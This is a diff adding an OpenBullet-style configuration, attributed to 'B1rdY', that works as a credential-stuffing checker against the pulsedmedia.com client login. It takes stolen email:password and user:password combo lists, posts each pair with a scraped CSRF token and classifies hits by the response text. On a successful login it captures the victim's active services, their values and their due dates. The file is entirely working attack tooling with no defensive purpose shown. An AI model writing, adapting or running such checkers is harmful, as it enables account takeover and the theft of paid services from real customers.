@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "pulsedseedbox",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-09T11:51:11.7081874+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "http://pulsedmedia.com/login.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=token]" "value" 0 -> VAR "TOKEN" "" "" 
+#POST_LOGIN REQUEST POST "https://pulsedmedia.com/clients/dologin.php" AutoRedirect=TRUE 
+  CONTENT "token=<TOKEN>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: http://pulsedmedia.com/login.php" 
+  HEADER "Origin: http://pulsedmedia.com" 
+  HEADER "Host: pulsedmedia.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "Your Active Products/Services" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=token]" "value" 0 -> VAR "TOKEN" "" "" 
+#PARSE_REMEMBERME PARSE "<SOURCE>" CSS "[name=rememberme]" "value" 0 -> VAR "REMEMBERME" "" "" 
+#POST_LOGIN REQUEST POST "https://pulsedmedia.com/clients/clientarea.php?action=services" AutoRedirect=TRUE 
+  CONTENT "token=<TOKEN>&username=<USER>&password=<PASS>&rememberme=<REMEMBERME>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: http://pulsedmedia.com/login.php" 
+  HEADER "Origin: http://pulsedmedia.com" 
+  HEADER "Host: pulsedmedia.com" 
+#ACTIVE PARSE "<SOURCE>" CSS "#Primary_Sidebar-My_Services_Status_Filter-Active > span.badge" "innerHTML" 0 -> CAP "ACTIVE" "" "" 
+#SERVICES PARSE "<SOURCE>" LR "<td><strong>" "</strong><br" Recursive=TRUE -> CAP "SERVICES" "" "" 
+#VALUE PARSE "<SOURCE>" CSS "#tableServicesList > tbody > tr > td:nth-child(2)" "innerHTML" Recursive=TRUE -> CAP "VALUE" "" "" 
+#DUEDATE PARSE "<SOURCE>" CSS "#tableServicesList > tbody > tr > td:nth-child(3) > span" "innerHTML" Recursive=TRUE -> CAP "DUEDATE" "" "" 
